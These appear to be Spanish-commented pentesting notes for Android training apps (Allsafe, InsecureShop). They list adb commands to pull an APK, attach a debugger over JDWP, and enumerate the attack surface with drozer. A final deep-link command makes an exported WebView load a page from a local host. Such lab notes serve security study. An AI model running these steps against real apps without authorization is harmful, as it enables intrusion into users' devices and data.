```
# Copiar el apk
adb shell pm list packages -f
adb shell pm list packages -f "allsafe"
adb pull /data/app/~~oZ0lNhDdkIp2NaWMhGczgw==/infosecadventures.allsafe-ttByxQb49HI7GiOb62XhPQ==/base.apk /root/Desktop/

# Correrlo en modo debugger
adb jdwp
adb forward tcp:55555 jdwp:<PID>
jdb -connect com.sun.jdi.SocketAttach:hostname=localhost,port=55555

#
drozer conbsole connect
  run app.package.attacksurface com.insecureshop
  run app.activity.info -a com.insecureshop
  run app.activity.start --component com.insecureshop com.insecureshop.WebViewActivity
# Para buscar deeplink intent-filter, tambien leer WebViewActivity.java
adb shell am start -W -a android.intent.action.VIEW -d "insecureshop://com.insecureshop/web?url=http://192.168.1.4:8082/test.html"
```
